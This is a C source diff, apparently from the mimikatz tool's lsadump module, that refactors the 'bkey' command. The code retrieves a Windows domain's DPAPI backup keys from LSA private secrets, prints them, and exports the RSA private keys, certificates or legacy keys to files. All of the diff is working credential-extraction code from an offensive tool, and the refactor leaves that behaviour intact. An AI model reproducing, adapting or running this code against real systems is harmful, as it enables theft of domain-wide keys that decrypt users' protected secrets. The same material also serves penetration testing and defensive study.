@@ -1641,80 +1641,88 @@ NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR secretName, PUNICODE_STRIN
 	return status;
 }
 
-NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport)
+void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PKIWI_BACKUP_KEY secret, DWORD size, BOOL isExport)
 {
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
-	UNICODE_STRING secret;
-	PKIWI_BACKUP_KEY buffer;
 	HCRYPTPROV hCryptProv;
 	HCRYPTKEY hCryptKey;
 	PVOID data;
 	DWORD len;
+	UNICODE_STRING uString;
+	PWCHAR filename = NULL, shortname;
 
-	wchar_t *filename = NULL, keyName[48+1] = L"G$BCKUPKEY_", *shortname = keyName + 11;
+	if(NT_SUCCESS(RtlStringFromGUID(guid, &uString)))
+	{
+		uString.Buffer[uString.Length / sizeof(wchar_t) - 1] = L'\0';
+		shortname = uString.Buffer + 1;
+		switch(secret->version)
+		{
+		case 2:
+			kprintf(L"  * RSA key\n");
+			if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
+			{
+				if(CryptImportKey(hCryptProv, secret->data,  secret->keyLen, 0, CRYPT_EXPORTABLE, &hCryptKey))
+				{
+					kuhl_m_crypto_printKeyInfos(0, hCryptKey);
+					if(isExport)
+					{
+						kuhl_m_crypto_exportKeyToFile(0, hCryptKey, AT_KEYEXCHANGE, L"ntds", 0, shortname);
+						filename = kuhl_m_crypto_generateFileName(L"ntds", L"capi", 0, shortname, L"der");
+						data = secret->data + secret->keyLen;
+						len = secret->certLen;
+					}
+					CryptDestroyKey(hCryptKey);
+				}
+				CryptReleaseContext(hCryptProv, 0);
+			}
+			break;
+		case 1:
+			kprintf(L"  * Legacy key\n");
+			kull_m_string_wprintf_hex((PBYTE) secret + sizeof(DWORD), size - sizeof(DWORD), (32 << 16));
+			kprintf(L"\n");
+			if(isExport)
+			{
+				filename = kuhl_m_crypto_generateFileName(L"ntds", L"legacy", 0, shortname, L"key");
+				data = (PBYTE) secret + sizeof(DWORD);
+				len = size - sizeof(DWORD);
+			}
+			break;
+		default:
+			kprintf(L"  * Unknown key (seen as %08x)\n", secret->version);
+			kull_m_string_wprintf_hex(secret, size, (32 << 16));
+			kprintf(L"\n");
+			if(isExport)
+			{
+				filename = kuhl_m_crypto_generateFileName(L"ntds", L"unknown", 0, shortname, L"key");
+				data = secret;
+				len = size;
+			}
+		}
+		if(filename)
+		{
+			if(data && len)
+				kprintf(L"\tExport         : %s - \'%s\'\n", kull_m_file_writeData(filename, data, len) ? L"OK" : L"KO", filename);
+			LocalFree(filename);
+		}
+		RtlFreeUnicodeString(&uString);
+	}
+}
+
+NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport)
+{
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	UNICODE_STRING secret;
+	wchar_t keyName[48+1] = L"G$BCKUPKEY_";
 	keyName[48] = L'\0';
-
 
 	if(NT_SUCCESS(RtlStringFromGUID(guid, &secret)))
 	{
-		RtlCopyMemory(shortname, secret.Buffer + 1, 36 * sizeof(wchar_t));
+		RtlCopyMemory(keyName + 11, secret.Buffer + 1, 36 * sizeof(wchar_t));
 		RtlFreeUnicodeString(&secret);
 		
 		status = kuhl_m_lsadump_LsaRetrievePrivateData(keyName, &secret);
 		if(NT_SUCCESS(status))
 		{
-			buffer = (PKIWI_BACKUP_KEY) secret.Buffer;
-			switch(buffer->version)
-			{
-			case 2:
-				kprintf(L"  * RSA key\n");
-				if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
-				{
-					if(CryptImportKey(hCryptProv, buffer->data,  buffer->keyLen, 0, CRYPT_EXPORTABLE, &hCryptKey))
-					{
-						kuhl_m_crypto_printKeyInfos(0, hCryptKey);
-
-						if(isExport)
-						{
-							kuhl_m_crypto_exportKeyToFile(0, hCryptKey, AT_KEYEXCHANGE, L"ntds", 0, shortname);
-							filename = kuhl_m_crypto_generateFileName(L"ntds", L"capi", 0, shortname, L"der");
-							data = buffer->data + buffer->keyLen;
-							len = buffer->certLen;
-						}
-						CryptDestroyKey(hCryptKey);
-					}
-					CryptReleaseContext(hCryptProv, 0);
-				}
-				break;
-			case 1:
-				kprintf(L"  * Legacy key\n");
-				kull_m_string_wprintf_hex((PBYTE) secret.Buffer + sizeof(DWORD), secret.Length - sizeof(DWORD), (32 << 16));
-				kprintf(L"\n");
-				if(isExport)
-				{
-					filename = kuhl_m_crypto_generateFileName(L"ntds", L"legacy", 0, shortname, L"key");
-					data = (PBYTE) secret.Buffer + sizeof(DWORD);
-					len = secret.Length - sizeof(DWORD);
-				}
-				break;
-			default:
-				kprintf(L"  * Unknown key (seen as %08x)\n", buffer->version);
-				kull_m_string_wprintf_hex(secret.Buffer, secret.Length, (32 << 16));
-				kprintf(L"\n");
-				if(isExport)
-				{
-					filename = kuhl_m_crypto_generateFileName(L"ntds", L"unknown", 0, shortname, L"key");
-					data = secret.Buffer;
-					len = secret.Length;
-				}
-			}
-
-			if(filename && data && len)
-			{
-				kprintf(L"\tExport         : %s - \'%s\'\n", kull_m_file_writeData(filename, data, len) ? L"OK" : L"KO", filename);
-				LocalFree(filename);
-			}
-
+			kuhl_m_lsadump_analyzeKey(guid, (PKIWI_BACKUP_KEY) secret.Buffer, secret.Length, isExport);
 			LocalFree(secret.Buffer);
 		}
 		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
@@ -1726,7 +1734,7 @@ NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
 {
 	NTSTATUS status;
 	UNICODE_STRING secret;
-	GUID guidPreferredKey, guidW2KPreferredKey;
+	GUID guid;
 	PCWCHAR szGuid = NULL;
 	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
 	
@@ -1734,24 +1742,23 @@ NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
 	if(szGuid)
 	{
 		RtlInitUnicodeString(&secret, szGuid);
-		status = RtlGUIDFromString(&secret, &guidPreferredKey);
+		status = RtlGUIDFromString(&secret, &guid);
 		if(NT_SUCCESS(status))
 		{
-			kprintf(L"\n"); kull_m_string_displayGUID(&guidPreferredKey); kprintf(L" seems to be a valid GUID\n");
-			kuhl_m_lsadump_getKeyFromGUID(&guidPreferredKey, export);
+			kprintf(L"\n"); kull_m_string_displayGUID(&guid); kprintf(L" seems to be a valid GUID\n");
+			kuhl_m_lsadump_getKeyFromGUID(&guid, export);
 		}
 		else PRINT_ERROR(L"Invalide GUID (0x%08x) ; %s\n", status, szGuid);
 	}
 	else
 	{
-		kprintf(L"\nCurrent prefered key:       "); 
+		kprintf(L"\nCurrent prefered key:       ");
 		status = kuhl_m_lsadump_LsaRetrievePrivateData(L"G$BCKUPKEY_PREFERRED", &secret);
 		if(NT_SUCCESS(status))
 		{
-			guidPreferredKey = *(LPCGUID) secret.Buffer;
+			kull_m_string_displayGUID((LPCGUID) secret.Buffer); kprintf(L"\n");
+			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export);
 			LocalFree(secret.Buffer);
-			kull_m_string_displayGUID(&guidPreferredKey); kprintf(L"\n");
-			kuhl_m_lsadump_getKeyFromGUID(&guidPreferredKey, export);
 		}
 		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
 
@@ -1759,10 +1766,9 @@ NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
 		status = kuhl_m_lsadump_LsaRetrievePrivateData(L"G$BCKUPKEY_P", &secret);
 		if(NT_SUCCESS(status))
 		{
-			guidW2KPreferredKey = *(LPCGUID) secret.Buffer;
+			kull_m_string_displayGUID((LPCGUID) secret.Buffer); kprintf(L"\n");
+			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export);
 			LocalFree(secret.Buffer);
-			kull_m_string_displayGUID(&guidW2KPreferredKey); kprintf(L"\n");
-			kuhl_m_lsadump_getKeyFromGUID(&guidW2KPreferredKey, export);
 		}
 		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
 	}
